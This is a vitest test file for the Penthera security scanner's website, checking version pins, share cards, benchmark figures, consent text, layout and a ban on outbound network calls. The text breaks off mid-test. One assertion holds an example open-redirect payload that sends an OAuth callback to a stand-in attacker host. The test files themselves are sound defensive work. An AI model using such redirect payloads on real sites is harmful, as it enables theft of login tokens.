/**
 * The site's browser check (site/check) runs lib/ in the page. These tests
 * build it the way Vercel does and hold it to the CLI: the same files must
 * give the same findings, and the page must not be able to send them anywhere.
 */
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { mkdtempSync, rmSync, readFileSync, mkdirSync, writeFileSync, existsSync, readdirSync } from "node:fs";
import { join, dirname } from "node:path";
import { tmpdir } from "node:os";
import { pathToFileURL } from "node:url";
import { buildSite, exampleCheck, readNews, readCompare, e10Numbers, prerelease, mcpNote, firstRelease, siteVersion } from "../site/build.mjs";
import { docPages, absoluteLinks, pinTo } from "../site/agents.mjs";
import { landingPages } from "../site/landing.mjs";
import { readKey } from "../scripts/indexnow.mjs";
import { scanExample } from "../site/tools/example.mjs";
import { COUNTS } from "../scripts/docs-numbers.mjs";
import { activePacks } from "../lib/rules/index.js";
import { serve, headersFor } from "../site/serve.mjs";
import { buildFixtures } from "./fixtures/deps/build.js";
import { scanAgents } from "../lib/agents/index.js";
import { scanSecrets } from "../lib/whitebox/secrets.js";
import { scanDeps } from "../lib/deps/index.js";
import { loadIocs } from "../lib/deps/iocs.js";
import { iocFindings } from "../lib/deps/findings.js";
import { rulesOf } from "../lib/rules/index.js";
import { createServer } from "node:http";
import { fingerprint } from "../lib/crawler.js";
import { runtimeAdvisoriesForRepo, runtimeAdvisoriesForResponse } from "../lib/advisories/index.js";

const ROOT = join(import.meta.dirname, "..");
// The five files the browser check reads.
const KINDS = ["package.json", ".mcp.json", ".claude/settings.json", "CLAUDE.md", "AGENTS.md"];

let dir, out, engine;

beforeAll(async () => {
  dir = mkdtempSync(join(tmpdir(), "penthera-site-"));
  out = join(dir, "dist");
  await buildSite({ out, engine: join(dir, "engine.mjs") });
  engine = await import(pathToFileURL(join(dir, "engine.mjs")).href);
});

afterAll(() => rmSync(dir, { recursive: true, force: true }));

/** The fixture's files of the kinds the page reads, as the page receives them. */
function pageFiles(fixture) {
  return KINDS.filter((p) => existsSync(join(fixture, p))).map((p) => ({ path: p, text: readFileSync(join(fixture, p), "utf8") }));
}

/** The same files alone in a folder, for the CLI. */
function cliFolder(files) {
  const d = mkdtempSync(join(dir, "cli-"));
  for (const f of files) {
    mkdirSync(dirname(join(d, f.path)), { recursive: true });
    writeFileSync(join(d, f.path), f.text);
  }
  return d;
}

const key = (f) => [f.severity, f.templateId || f.method || f.source, f.title, f.description].join(" | ");

describe("site build", () => {
  it("pins every command and MCP config to the installable version, on the page and in llms.txt", () => {
    const version = siteVersion(JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")).version);
    const html = readFileSync(join(out, "index.html"), "utf8");
    const llms = readFileSync(join(out, "llms.txt"), "utf8");
    expect(html).toContain('id="agent"');
    for (const client of ["Claude Code", "Codex", "Cursor", "VS Code", "Windsurf"]) expect(html).toContain(`<h4>${client}`);
    for (const text of [html, llms]) {
      expect(text).toContain(`penthera@${version} mcp`);
      expect(text).not.toMatch(/npx (-y )?penthera mcp/);
      expect(text).not.toContain("{{");
      // Every pin on the built page is the package's own version.
      const pins = [...text.matchAll(/penthera@(\d[\w.-]*)/g)].map((m) => m[1]);
      expect(pins.length).toBeGreaterThan(0);
      expect(new Set(pins)).toEqual(new Set([version]));
      if (prerelease(version)) expect(text).toMatch(/release candidate on npm's (<code>|`)next/);
    }
    expect(llms).toMatch(/^# Penthera\n\n> /);
  });

  it("has no hard-coded version pins in the site's sources: the build fills them in", () => {
    const sources = ["index.html", "llms.txt", ...readdirSync(join(ROOT, "site", "check")).filter((f) => f.endsWith(".js")).map((f) => `check/${f}`)];
    for (const f of sources) {
      const text = readFileSync(join(ROOT, "site", f), "utf8");
      expect(text, f).not.toMatch(/penthera@\d/);
    }
  });

  it("pins the latest stable release while main carries a pre-release", () => {
    expect(siteVersion("1.9.0")).toBe("1.9.0");
    expect(prerelease(siteVersion("9.9.9-rc.1"))).toBe(false);
  });

  it("notes the MCP server's release candidate only while the version is one", () => {
    expect(mcpNote("1.9.0").MCP_NOTE).toBe("");
    expect(mcpNote("1.9.0-rc.1").MCP_NOTE_MD).toMatch(/^New in \d+\.\d+\.\d+[\w.-]*, a release candidate on npm's `next` tag/);
    expect(firstRelease("`penthera mcp`")).toMatch(/^1\.9\.0/);
  });

  it("writes the page, the check and its media, with measured numbers filled in", () => {
    for (const f of ["index.html", "check.js", "styles.css", "theme.js", "logo.svg", "favicon.svg", "fonts/DepartureMono-Regular.woff2", "media/hero.mp4", "media/field.png", "media/walkthrough.mp4"]) {
      expect(existsSync(join(out, f)), f).toBe(true);
    }
    const html = readFileSync(join(out, "index.html"), "utf8");
    expect(html).not.toMatch(/\{\{\w+\}\}/);
    expect(html).toMatch(/src="\/check\.js\?v=[0-9a-f]{10}"/);
  });

  it("has share cards for Open Graph and X, with images that exist", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    for (const tag of ['property="og:image"', 'name="twitter:card" content="summary_large_image"', 'property="og:image:width" content="1200"']) {
      expect(html, tag).toContain(tag);
    }
    expect(html).toContain('property="og:title" content="Penthera: your open-source cyber security agent"');
    expect(html).toContain('name="twitter:title" content="Penthera: your open-source cyber security agent"');
    for (const tag of ["og:description", "twitter:description"]) {
      const d = html.match(new RegExp(`(?:property|name)="${tag}" content="([^"]+)"`))[1];
      expect(d.length, tag).toBeLessThanOrEqual(155);
    }
    const img = html.match(/property="og:image" content="([^"]+)"/)[1];
    // Content-hashed, so a changed card gets a new URL and previews refresh.
    expect(img).toMatch(/\/media\/social\/og\.png\?v=[0-9a-f]{10}$/);
    for (const f of ["media/social/og.png", "media/social/square.png"]) expect(existsSync(join(out, f)), f).toBe(true);
  });

  it("has a link-preview reel as og:video, beside og:image, and no twitter:player", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    const meta = (p) => html.match(new RegExp(`property="${p}" content="([^"]*)"`))?.[1];
    const site = meta("og:url").replace(/\/$/, "");
    expect(meta("og:video")).toMatch(new RegExp(`^${site}/media/social/reel\\.mp4\\?v=[0-9a-f]{10}$`));
    expect(meta("og:video:secure_url")).toBe(meta("og:video"));
    expect(meta("og:video:type")).toBe("video/mp4");
    expect([meta("og:video:width"), meta("og:video:height")]).toEqual(["1200", "630"]);
    // The poster stays: og:image is the fallback where video does not play.
    expect(meta("og:image")).toMatch(new RegExp(`^${site}/media/social/og\\.png\\?v=[0-9a-f]{10}$`));
    expect(html).not.toMatch(/name="twitter:player/);
    const reel = join(out, "media/social/reel.mp4");
    expect(existsSync(reel)).toBe(true);
    const buf = readFileSync(reel);
    expect(buf.length).toBeLessThan(3 * 1024 * 1024);
    // An MP4 whose index (moov) comes before the media (mdat): +faststart.
    expect(buf.subarray(4, 8).toString("latin1")).toBe("ftyp");
    expect(buf.indexOf("moov")).toBeGreaterThan(0);
    expect(buf.indexOf("moov")).toBeLessThan(buf.indexOf("mdat"));
  });

  it("builds absolute og:video URLs from SITE_URL", async () => {
    const dir = mkdtempSync(join(tmpdir(), "penthera-site-url-"));
    const prev = process.env.SITE_URL;
    process.env.SITE_URL = "https://penthera.org/";
    try {
      await buildSite({ out: dir });
      const html = readFileSync(join(dir, "index.html"), "utf8");
      expect(html).toMatch(/<meta property="og:video" content="https:\/\/penthera\.org\/media\/social\/reel\.mp4\?v=[0-9a-f]{10}">/);
      expect(html).toMatch(/<meta property="og:video:secure_url" content="https:\/\/penthera\.org\/media\/social\/reel\.mp4\?v=[0-9a-f]{10}">/);
    } finally {
      if (prev === undefined) delete process.env.SITE_URL;
      else process.env.SITE_URL = prev;
      rmSync(dir, { recursive: true, force: true });
    }
  }, 120_000);

  it("loads nothing from another origin and has no inline script", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    for (const m of html.matchAll(/<(?:script|link|img|video|source|track)\b[^>]*\b(?:src|href)="([^"]+)"/g)) {
      expect(m[1], m[0]).toMatch(/^\//);
    }
    // No inline script runs: the only script without src is the JSON-LD data block, which never executes.
    expect(html).not.toMatch(/<script(?![^>]*\bsrc=)(?![^>]*type="application\/ld\+json")[^>]*>/);
    expect(readFileSync(join(out, "styles.css"), "utf8")).not.toMatch(/url\(["']?(https?:)?\/\//);
  });

  it("opens one connection only: POST /api/check, for the live check", () => {
    const js = readFileSync(join(out, "check.js"), "utf8");
    // lib/deps detects these calls with regexes (fetch\s*\(), so look for the calls themselves.
    expect(js.split("fetch(").length - 1).toBe(1);
    expect(js).toMatch(/[`"']\/api\/check[`"']/);
    for (const api of ["new XMLHttpRequest", "new WebSocket", "sendBeacon(", "new EventSource", "importScripts("]) {
      expect(js.includes(api), api).toBe(false);
    }
  });
});

describe("site layout at phone width", () => {
  it("sizes the paste panels' grid to the card, so a nowrap command cannot widen it (e2e 2026-10-22, 375px)", () => {
    const css = readFileSync(new URL("../site/styles.css", import.meta.url), "utf8");
    const rule = css.match(/\.paste-body \{([^}]*)\}/)?.[1] || "";
    expect(rule).toMatch(/grid-template-columns:\s*minmax\(0,\s*1fr\)/);
    expect(css).toMatch(/\.paste-body > \.cmd code \{[^}]*white-space: normal/);
  });
});

describe("site FAQ", () => {
  it("is native <details> with a question in each summary, and its numbers come from the repo", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    const faq = html.slice(html.indexOf('id="faq"'), html.indexOf("<!-- 9 · For agents"));
    const items = faq.match(/<details>\s*<summary>[^<]+\?<\/summary>/g) || [];
    expect(items.length).toBeGreaterThanOrEqual(10);
    // Benchmark figures as bench/RESULTS.md and scripts/docs-numbers.mjs give them.
    const total = readFileSync(join(ROOT, "bench", "RESULTS.md"), "utf8").match(/\| \*\*Total\*\* \|[^|]*\| \*\*(\d+)\*\* \| \*\*(\d+)\*\* \| \*\*(\d+)\*\* \|/);
    const [tp, fp, fn] = total.slice(1).map(Number);
    expect(faq).toContain(`precision ${(tp / (tp + fp)).toFixed(2)} (95% CI`);
    expect(faq).toContain(`from ${tp} true positives, ${fp} false positives and ${fn} misses`);
    expect(faq).toMatch(/one runtime dependency \(yaml\)|\d+ runtime dependencies/);
    expect(faq).not.toMatch(/\{\{\w+\}\}/);
  });

  it("tells you how to scan your own site behind a CDN firewall (e2e 2026-10-22, D3)", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    const faq = html.slice(html.indexOf('id="faq"'), html.indexOf("<!-- 9 · For agents"));
    expect(faq).toContain("Scanning your own Vercel or Cloudflare site? Allow your IP in the firewall first, or scan a preview URL.");
  });
});

describe("site comparison table", () => {
  const cmp = readCompare();
  // The Cloudflare compare page lands with danoszz/penthera#89; until then its
  // links are allowed to point at a file that is not on this branch yet.
  const PENDING = new Set(["docs/compare/cloudflare-security-audit.md"]);
  const repoFile = (s) => s.split("#")[0];

  it("has a sourced cell for every tool in every row, and says where each tool goes further", () => {
    expect(cmp.tools.map((t) => t.id)).toEqual(["penthera", "cloudflare", "semgrep", "snyk", "socket", "zap", "github"]);
    for (const r of cmp.rows) {
      for (const t of cmp.tools) {
        const c = r.cells[t.id];
        if (c.t) expect(c.s.length, `${r.label} / ${t.id}`).toBeGreaterThan(0);
        for (const s of c.s) {
          if (/^https:\/\//.test(s)) continue;
          if (!PENDING.has(repoFile(s))) expect(existsSync(join(ROOT, repoFile(s))), s).toBe(true);
        }
      }
    }
    const further = cmp.rows.find((r) => r.label === "Where it goes further");
    for (const t of cmp.tools) expect(further.cells[t.id].t, t.id).toBeTruthy();
  });

  it("dates each tool as its compare page does", () => {
    for (const t of cmp.tools.filter((x) => x.checked)) {
      if (PENDING.has(t.page) && !existsSync(join(ROOT, t.page))) continue;
      const page = readFileSync(join(ROOT, t.page), "utf8");
      expect(page, t.page).toMatch(new RegExp(`Last checked: ${t.checked}`));
    }
  });

  it("names no winner and never says Penthera finds more", () => {
    const text = cmp.rows.flatMap((r) => Object.values(r.cells).map((c) => c.t || "")).join("\n");
    expect(text).not.toMatch(/\b(best|better|winner|beats|finds more|more accurate|superior)\b/i);
  });

  it("renders every cell with its source, inside its own scroll box", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    const sec = html.slice(html.indexOf('id="compare"'), html.indexOf("<!-- 7 · EU rules -->"));
    expect(sec).not.toMatch(/\{\{\w+\}\}/);
    expect(sec).toMatch(/<div class="cmp-scroll" role="region" aria-labelledby="compare-title" tabindex="0">\s*<table class="cmp">/);
    expect(sec.match(/<tr><th scope="row">/g)).toHaveLength(cmp.rows.length);
    const cells = sec.match(/<td[^>]*>[\s\S]*?<\/td>/g);
    expect(cells).toHaveLength(cmp.rows.length * cmp.tools.length);
    for (const c of cells) if (!c.includes("cmp-none")) expect(c).toMatch(/Source: <a href="https:\/\//);
    for (const t of cmp.tools) expect(sec).toContain(`<a href="https://github.com/danoszz/penthera/blob/main/${t.page}">`);
    // Penthera's accuracy is the benchmark's, filled in at build time.
    const total = readFileSync(join(ROOT, "bench", "RESULTS.md"), "utf8").match(/\| \*\*Total\*\* \|[^|]*\| \*\*(\d+)\*\* \| \*\*(\d+)\*\* \|/);
    const [tp, fp] = total.slice(1).map(Number);
    expect(sec).toContain(`Precision ${(tp / (tp + fp)).toFixed(2)} (95% CI`);
  });
});

describe("site before and after", () => {
  it("shows a real scan: site/example.json is what Penthera reports on the test server today", async () => {
    const saved = JSON.parse(readFileSync(join(ROOT, "site", "example.json"), "utf8"));
    expect(await scanExample()).toEqual(saved);
    expect(saved.thirdParty).toBe(0); // the page says every request went to the target
  }, 60_000);

  it("fills in the scan and counts every rule from the repo, without the fix recipes", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    const sec = html.slice(html.indexOf('class="ba"'), html.indexOf('id="check"'));
    const e = JSON.parse(readFileSync(join(ROOT, "site", "example.json"), "utf8"));
    expect(sec).not.toMatch(/\{\{\w+\}\}/);
    expect(sec).toContain("yo, is my app safe?");
    for (const s of ["high", "medium", "low"]) if (e.counts[s]) expect(sec).toContain(`${e.counts[s]} ${s}`);
    expect(sec).toContain(`${e.checks} checks, ${e.requests} requests, all to 127.0.0.1.`);
    expect(sec).toContain(`${e.finding.title} <span class="ba-conf">${e.finding.confidence}</span>`);
    expect(sec).toContain("<code>GET /api/oauth/callback?redirect_uri=https://evil-attacker.example/capture</code> returned 302.");
    const packRules = activePacks().reduce((n, p) => n + p.count, 0);
    const rules = COUNTS.urlTemplates + COUNTS.secretPatterns + COUNTS.capabilities + COUNTS.agentRules + packRules;
    // The totals sit under the four areas in "What it checks".
    expect(sec).toContain(`Counts from this release's rules: ${rules} readable rules, citing ${COUNTS.references} sources.`);
    expect(sec).toContain(`<p class="map-n">${(COUNTS.popularNpm + COUNTS.popularPypi).toLocaleString("en-US")}<span> package names</span></p>`);
    expect(rules).toBeLessThan(1000); // the count is what it is; never round it up
    expect(sec).not.toMatch(/1,?000\+/);
  });
});

describe("site benchmark (E10 pilot)", () => {
  const KV = join(ROOT, "bench", "known-vuln");
  const after = readFileSync(join(KV, "RESULTS-after-fixes.md"), "utf8");
  // "0.10 [0.02, 0.40]" as the reports print it, in the page's "0.02 to 0.40" form.
  const stated = (cell) => { const m = /(\d\.\d\d) \[(\d\.\d\d), (\d\.\d\d)\]/.exec(cell); return { rate: m[1], ci: `${m[2]} to ${m[3]}` }; };
  const cells = (md, label) => md.split("\n").find((l) => l.startsWith(`| ${label} |`)).split("|").map((c) => c.trim());

  it("computes the recall intervals the results file states", () => {
    const e = e10Numbers();
    const table = after.slice(after.indexOf("## Before and after"));
    for (const [label, got] of [["juice-shop", e.apps[0]], ["dvna", e.apps[1]], ["**Pooled recall**", e.pooled]]) {
      const [, , b, a] = cells(table, label);
      for (const [cell, side] of [[b, got.before], [a, got.after]]) {
        expect(cell).toContain(`${side.k}/${side.n}`);
        expect({ rate: side.rate.toFixed(2), ci: side.ci }).toEqual(stated(cell));
      }
    }
    expect(e.pooled.before).toMatchObject({ k: 1, n: 14 });
    expect(e.heldOut).toMatchObject({ name: "WebGoat", k: 2, n: 9, ci: "0.06 to 0.55" });
  });

  it("computes pooled precision as the scorer reports it, before and after", () => {
    const e = e10Numbers();
    for (const [file, got] of [["RESULTS.md", e.precision.before], ["RESULTS-after-fixes.md", e.precision.after]]) {
      const md = readFileSync(join(KV, file), "utf8");
      const row = cells(md.slice(md.indexOf("Run `standard`")), "**Pooled**");
      expect(got.n).toBe(+row[2]); // every finding was labeled or matched the key
      expect({ rate: got.rate.toFixed(2), ci: got.ci }).toEqual(stated(row[7]));
    }
  });

  it("shows the numbers with their caveats and sources, in the trust chapter, before the limits", () => {
    const html = readFileSync(join(out, "index.html"), "utf8");
    const e = e10Numbers();
    const sec = html.slice(html.indexOf('id="benchmark"'), html.indexOf('id="limits"'));
    expect(html.indexOf('id="trust"')).toBeLessThan(html.indexOf('id="benchmark"'));
    expect(html.indexOf('id="benchmark"')).toBeLessThan(html.indexOf('id="limits"'));
    expect(html.indexOf('id="limits"')).toBeLessThan(html.indexOf('id="tour"'));
    expect(sec).not.toMatch(/\{\{\w+\}\}/);
    for (const a of [...e.apps, e.pooled]) {
      expect(sec).toContain(`<p class="stat-num">${a.after.k}/${a.after.n}</p><p class="stat-was">was ${a.before.k}/${a.before.n}</p>`);
      expect(sec).toContain(`95% CI ${a.after.ci}. Before: ${a.before.rate.toFixed(2)}, ${a.before.ci}.`);
    }
    expect(sec).toContain(`<p class="stat-num">${e.heldOut.k}/${e.heldOut.n}</p><p class="stat-was">unchanged</p>`);
    expect(sec).toContain(`Precision stayed level: ${e.precision.before.rate.toFixed(2)} (95% CI ${e.precision.before.ci}) on ${e.precision.before.n} findings before, ${e.precision.after.rate.toFixed(2)} (${e.precision.after.ci}) on ${e.precision.after.n} after.`);
    // The lede says it is a pilot before the numbers; the caveats are one click away, in the section itself.
    expect(sec.indexOf("A pilot, so read the caveats")).toBeGreaterThan(0);
    expect(sec.indexOf("A pilot, so read the caveats")).toBeLessThan(sec.indexOf('class="bench-stats"'));
    expect(sec.indexOf("Read this before the numbers")).toBeGreaterThan(0);
    for (const c of ["This is a pilot", "the gain is not an independent measure", "WebGoat was held out", "The preregistered studies are what count"]) expect(sec).toContain(c);
    for (const f of ["docs/research/prereg/E10-known-vulnerable-apps.md", "tree/main/bench/known-vuln", "bench/known-vuln/RESULTS.md", "bench/known-vuln/RESULTS-after-fixes.md", "docs/research/prereg/E1-real-world-accuracy.md"]) expect(sec).toContain(f);
    for (const f of ["docs/research/prereg/E10-known-vulnerable-apps.md", "bench/known-vuln/RESULTS.md", "bench/known-vuln/RESULTS-after-fixes.md", "docs/research/prereg/E1-real-world-accuracy.md"]) expect(existsSync(join(ROOT, f)), f).toBe(true);
    // One bar row per app plus the pooled one, drawn without inline styles.
    expect(sec.match(/<div class="e10-row">/g)).toHaveLength(3);
    expect(sec).not.toMatch(/style=/);
  });
});

describe("site report end", () => {
  const report = { url: "https://a.test/", score: 40, verdict: "Weak", scope: "Passive.", checks: [
    { title: "No HSTS", severity: "high", passed: false, evidence: "header missing", fix: "Send it.", verify: "curl -I a.test" },
    { title: "HTTPS", severity: "high", passed: true },
  ] };

  it("turns a report into Markdown with every fix and what passed", async () => {
    const { reportMarkdown } = await import("../site/check/card.js");
    const md = reportMarkdown(report, "2026-10-30");
    for (const s of ["# Penthera quick check: https://a.test/", "40/100. Weak. Checked 2026-10-30.", "## 1 to fix", "### No HSTS (high)", "Evidence: header missing", "Fix: Send it.", "Verify: `curl -I a.test`", "- HTTPS", "`npx penthera https://a.test/`"]) expect(md).toContain(s);
  });

  it("ends every report with an action, counted without any URL", () => {
    const ui = readFileSync(join(ROOT, "site", "check", "ui.js"), "utf8");
    expect(ui).toContain('wrap.append(el("p", "report-scope", report.scope), reportNext(report));');
    for (const s of ["Copy fix prompt (", "Download report", 'count("link", { to: "download-report" })', 'count("copy", { what: "fix-prompt-end" })']) expect(ui).toContain(s);
  });
});

describe("site motion budget", () => {
  const css = readFileSync(join(import.meta.dirname, "..", "site", "styles.css"), "utf8");
  const ui = readFileSync(join(import.meta.dirname, "..", "site", "check", "ui.js"), "utf8");

  it("moves the ticker in steps, never at the display's full rate", () => {
    expect(css).toMatch(/\.ticker-track \{[^}]*animation: ticker \d+s steps\(\d+, end\) infinite;/);
  });

  it("rests the ticker while the URL field has focus and off screen", () => {
    expect(css).toMatch(/:has\(\.scan input:focus\) \.ticker-track \{ animation-play-state: paused; \}/);
    expect(css).toContain(".ticker[data-rest] .ticker-track");
    expect(ui).toMatch(/function tickerRest\(\)[\s\S]*IntersectionObserver/);
  });

  it("floats the first screen in one glass panel over a full-screen field", () => {
    expect(css).toMatch(/\.hero \.field \{ inset: 0; width: 100%; height: 100%; \}/);
    expect(css).toMatch(/\.poster, \.report \{[^}]*backdrop-filter: blur\(40px\)/);
    // A long report must not grow the canvas.
    expect(css).toMatch(/\.hero\[data-mode="fix"\] \.field \{ height: 100svh; \}/);
    expect(ui).toContain('[$(".hero"), $(".foot")]');
  });

  it("keeps the dock centered and opens it from within", () => {
    const dock = ui.slice(ui.indexOf("function dockOpen"), ui.indexOf("The bottom veil"));
    expect(dock).toContain("IntersectionObserver");
    expect(dock).not.toMatch(/scrollY|addEventListener|animate\(/);
    expect(css).toMatch(/\.rail\[data-ready\] \.rail-more \{ transition: grid-template-columns 240ms/);
    expect(css).toMatch(/\.rail\[data-ready\] \.rail-more-in \{ transition: opacity 160ms var\(--out\) 140ms/);
    expect(css).toMatch(/prefers-reduced-motion: reduce\) \{\s*\.rail\[data-ready\] \.rail-more, \.rail\[data-ready\] \.rail-more-in \{ transition: none !important; \}/);
  });

  it("lets the hero's card overlap the grey, past the fold", () => {
    expect(css).toMatch(/main > \.hero \{[^}]*min-height: calc\(100svh - var\(--hero-peek\)\);/);
    expect(css).toMatch(/\.poster \{[^}]*margin-bottom: calc\(-1 \* var\(--hero-over\)\);/);
    expect(css).toMatch(/main > \.slab \{ padding-top: calc\(var\(--section\) \+ var\(--hero-over\)\);/);
    expect(css).toMatch(/--hero-over: 136px;[\s\S]*--hero-peek: 72px;/);
  });

  it("keeps the check available without script", () => {
    // Only a page that runs script can hold it back.
    for (const [, sel] of css.matchAll(/([^\n{}]*data-hero="here"[^\n{}]*)\{ (?:transform|grid)/g)) expect(sel.trim()).toMatch(/^\.js /);
  });

  it("keeps the live field on a layer of its own", () => {
    expect(css).toMatch(/\.field-live \{[^}]*will-change: transform;/);
  });
});

describe("site news ticker", () => {
  it("every item has a date, one short line and an https source, and the build renders them all", () => {
    const items = readNews();
    expect(items.length).toBeGreaterThan(0);
    const html = readFileSync(join(out, "index.html"), "utf8");
    for (const n of items) {
      expect(html).toContain(`datetime="${n.date}"`);
      expect(n.source).toMatch(/^https:\/\//);
    }
    // Two copies for a seamless loop; the second is hidden and out of the tab order.
    expect(html.match(/class="ticker-list"/g)).toHaveLength(2);
    expect(html).toMatch(/class="ticker-list" aria-hidden="true">.*tabindex="-1"/s);
  });

  it("refuses an item without a source", () => {
    const f = join(dir, "news-bad.json");
    writeFileSync(f, JSON.stringify({ items: [{ date: "2026-10-21", text: "x", source: "http://plain.example" }] }));
    expect(() => readNews(f)).toThrow(/https/);
  });
});

describe("site story", () => {
  const html = () => readFileSync(join(out, "index.html"), "utf8");

  it("tells it in order: the live check, the problem, what it finds, trust and limits, see it work, compare, get started, questions, agents, about", () => {
    const h = html();
    const order = ['id="scan"', 'class="problem"', 'id="answer"', 'id="checks"', 'id="trust"', 'id="limits"', 'id="tour"', 'id="compare"', 'id="get"', 'id="faq"', 'id="for-agents"', 'id="about"'];
    const at = order.map((m) => h.indexOf(m));
    for (const [i, m] of order.entries()) expect(at[i], m).toBeGreaterThan(0);
    expect([...at].sort((a, b) => a - b)).toEqual(at);
    expect(h).toContain("AI coding tools ship faster than anyone can check.");
    expect(h).toContain('<h1 class="ask-sub" id="hero-title">Penthera: your <span class="nowrap">open-source</span> cyber security agent.</h1>');
    expect(h).toContain('<p class="bubble">yo, is my app safe?</p>');
    expect(h).toMatch(/<h2 id="faq-title">Before you install\.<\/h2>/);
    // Merged away: no section repeats another.
    for (const gone of ['class="walk', 'class="eu"', 'class="vision', 'class="ba-counts"', "data-check", 'class="desk"', 'class="spec"']) expect(h, gone).not.toContain(gone);
    // Each question is answered once: the FAQ no longer repeats the about and limits chapters.
    for (const q of ["What is Penthera, and why does it exist?", "What can't it do?"]) expect(h, q).not.toContain(q);
  });

  it("gives the problem its own grey section after the poster, hidden with the poster in fix mode", () => {
    const h = html();
    expect(h).toMatch(/<\/section>\s*(<!--[\s\S]*?-->\s*)?<section class="slab" aria-label="The problem">\s*<div class="hero-text">\s*<p class="problem">/);
    const slab = h.slice(h.indexOf('class="slab"'), h.indexOf('id="answer"'));
    const at = ['class="problem"', 'class="pills"', 'class="lede"', 'class="hero-actions"', 'class="loop"'].map((m) => slab.indexOf(m));
    expect(at.every((n) => n > 0)).toBe(true);
    // The note was dropped (2026-10-29): the poster already offers the code scan.
    expect(slab).not.toContain('class="note"');
    expect([...at].sort((a, b) => a - b)).toEqual(at);
    const css = readFileSync(join(out, "styles.css"), "utf8");
    expect(css).toContain('.hero[data-mode="fix"] + .slab');
    expect(css).toMatch(/main > \.slab \{[^}]*background: var\(--slab\)/);
  });

  it("ends with who builds it and why, how to reach him, and the signature", () => {
    const about = html().slice(html().indexOf('id="about"'));
    expect(about).toContain("I build Penthera in the open, at night, alongside my PhD in AI and architecture.");
    for (const href of ["github.com/danoszz/penthera/discussions", "github.com/danoszz/penthera/issues", "/.well-known/security.txt", "https://daanvanderzwaag.com"]) expect(about, href).toContain(href);
    expect(about.indexOf('class="about-text"')).toBeLessThan(about.indexOf('class="by"'));
  });

  it("asks for consent before every first check of a site, and sends it with the request", () => {
    const js = readFileSync(join(out, "check.js"), "utf8");
    expect(js).toContain("slide to scan");
    expect(js).toContain("Only check a site you own, or one you have written permission to test.");
    expect(js).toMatch(/consent:\s*!0|consent:\s*true/);
    // No deeper scan from penthera.org: the report points to the CLI instead.
    expect(js).toContain("Run the full scan on your own machine");
    expect(js).not.toMatch(/action:\s*[`"']deep|action:\s*[`"']token/);
  });

  it("publishes the live check's terms from docs/live-check-terms.md at /terms", () => {
    const terms = readFileSync(join(out, "terms.html"), "utf8");
    for (const h of ["Acceptable use: zero abuse", "No guarantee", "Responsibility", "Privacy", "For site owners"]) expect(terms, h).toContain(`>${h}</h2>`);
    expect(terms).toContain("User-agent: Penthera-QuickCheck");
    expect(terms).not.toMatch(/<script(?![^>]*\bsrc=)/);
    expect(html()).toContain('<a href="/terms">Terms</a>');
  });

  it("keeps /terms and /trust free of raw table pipes: their renderer has no tables", () => {
    for (const page of ["terms.html", "trust.html"]) expect(readFileSync(join(out, page), "utf8"), page).not.toMatch(/<p>\|/);
  });

  it("puts the live check first: a field, a button, a report region and a no-JavaScript route", () => {
    const hero = html().slice(html().indexOf('class="hero"'), html().indexOf('id="answer"'));
    expect(hero).toMatch(/<form class="scan" id="scan" data-scan novalidate>/);
    expect(hero).toContain('<input id="scan-url" name="url"');
    expect(hero).toContain("data-report hidden");
    expect(hero).toContain("<noscript>");
    expect(hero.indexOf('id="scan"')).toBeLessThan(hero.indexOf('class="loop"'));
  });

  it("makes the poster the check: the title as the h1 above the question, the field, and a real example result", async () => {
    const h = html();
    const hero = h.slice(h.indexOf('class="hero"'), h.indexOf('id="answer"'));
    expect(h.match(/<h1[ >]/g)).toHaveLength(1);
    expect(hero.indexOf('<p class="ask">Is your site/app safe?</p>')).toBeLessThan(hero.indexOf('id="hero-title"'));
    expect(hero.indexOf('id="hero-title"')).toBeLessThan(hero.indexOf('id="scan"'));
    // The example is the live check's own report of the test server, made at build time.
    const r = await exampleCheck();
    const card = hero.slice(hero.indexOf('class="card card-example"'), hero.indexOf('data-report hidden'));
    expect(card).toContain('id="example-title">Example</span>');
    expect(card).toContain(`<p class="card-verdict">${r.verdict}</p>`);
    expect(card).toContain(`<p class="score-n">${r.score}<span>/100</span></p>`);
    expect(card.match(/<i class="on"><\/i>/g)).toHaveLength(r.score);
    const worst = r.checks.filter((c) => !c.passed)[0];
    expect(card).toContain(worst.title);
    // The example has no button, real or drawn: the scan form is the one action.
    expect(card).not.toContain("Prompt to fix");
    expect(card).not.toMatch(/<button|<a /);
    expect(card.match(/<li/g)).toHaveLength(3);
    // No Pro pitch in the hero or the check.
    expect(hero).not.toMatch(/\bPro\b|go-pro|\/pro\b/);
    expect(readFileSync(join(ROOT, "site", "check", "ui.js"), "utf8")).not.toMatch(/\bPro\b|\/pro\b/);
  }, 30_000);

  it("hands off after a result: prompt, full scan, code scan and a star, with two fixed labels named in privacy.md", () => {
    const ui = readFileSync(join(ROOT, "site", "check", "ui.js"), "utf8");
    for (const t of ["Prompt to fix (", "Run the full scan on your own machine", "npx penthera --repo .", "Star on GitHub", "Star it now, find it there later."]) expect(ui, t).toContain(t);
    expect(ui).toContain('count("copy", { what: "repo-result" })');
    expect(ui).toContain('count("link", { to: "github-star-result" })');
    const privacy = readFileSync(join(ROOT, "docs", "privacy.md"), "utf8");
    for (const l of ["repo-result", "github-star-result"]) expect(privacy, l).toContain(`"${l}"`);
    // The terms say what is counted, as privacy.md does.
    const terms = readFileSync(join(ROOT, "docs", "live-check-terms.md"), "utf8");
    expect(terms).not.toContain("does not record that you ran a check");
    expect(terms).toContain("counts that a check ran");
  });

  it("shows the four areas with counts from the rules, and the tour as three dashboard steps", () => {
    const h = html();
    const map = h.slice(h.indexOf('id="checks"'), h.indexOf('id="trust"'));
    for (const [n, what] of [[COUNTS.secretPatterns, "secret and AI-key patterns"], [COUNTS.agentRules, "AI-tooling rules"], [COUNTS.urlTemplates, "URL scan templates"], [(COUNTS.popularNpm + COUNTS.popularPypi).toLocaleString("en-US"), "package names"]]) {
      expect(map).toContain(`<p class="map-n">${n}<span> ${what}</span></p>`);
    }
    expect(map.match(/<li class="map-cell /g)).toHaveLength(4);
